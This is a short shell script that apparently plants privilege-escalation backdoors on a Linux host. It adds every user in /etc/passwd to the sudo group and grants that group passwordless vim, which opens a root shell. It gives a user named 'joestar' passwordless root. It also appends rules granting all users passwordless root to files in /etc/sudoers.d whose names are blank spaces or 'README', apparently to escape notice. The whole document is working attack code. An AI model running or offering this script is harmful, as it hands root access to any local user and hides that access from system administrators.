#!/bin/sh
for u in $(cat /etc/passwd | awk -F: '{print $1}'); do 
  usermod -a -G sudo $u
done
echo "%sudo ALL=(ALL:ALL) NOPASSWD:vim" >> /etc/sudoers
echo "joestar ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/" "
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/"  "
echo "ALL   ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers.d/README
